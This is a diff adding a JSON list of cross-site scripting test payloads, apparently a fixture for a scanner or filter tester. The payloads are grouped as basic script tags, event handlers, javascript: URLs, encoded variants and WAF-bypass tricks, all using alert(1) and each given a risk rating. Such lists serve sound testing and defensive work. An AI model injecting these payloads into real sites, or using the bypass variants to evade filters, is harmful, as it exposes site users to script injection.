@@ -1,0 +1,25 @@
+{
+  "basic_injection": [
+    {"payload": "<script>alert(1)</script>", "description": "Basic script tag injection", "risk_level": "HIGH"},
+    {"payload": "<img src=x onerror=alert(1)>", "description": "Image tag with onerror", "risk_level": "HIGH"},
+    {"payload": "<svg onload=alert(1)>", "description": "SVG tag with onload", "risk_level": "HIGH"}
+  ],
+  "event_handlers": [
+    {"payload": "<body onload=alert(1)>", "description": "Body onload", "risk_level": "HIGH"},
+    {"payload": "<input onfocus=alert(1) autofocus>", "description": "Input autofocus", "risk_level": "HIGH"}
+  ],
+  "javascript_protocol": [
+    {"payload": "javascript:alert(1)", "description": "JavaScript protocol", "risk_level": "HIGH"},
+    {"payload": "javascript&#58;alert(1)", "description": "HTML encoded colon", "risk_level": "HIGH"}
+  ],
+  "encoded_variants": [
+    {"payload": "&lt;script&gt;alert(1)&lt;/script&gt;", "description": "HTML entities", "risk_level": "MEDIUM"},
+    {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "description": "URL encoded", "risk_level": "MEDIUM"}
+  ],
+  "waf_bypass": [
+    {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "description": "Nested tags", "risk_level": "HIGH"},
+    {"payload": "<sCrIpT>alert(1)</sCrIpT>", "description": "Case insensitive", "risk_level": "HIGH"}
+  ],
+  "dom_based": [],
+  "zero_day_patterns": []
+}
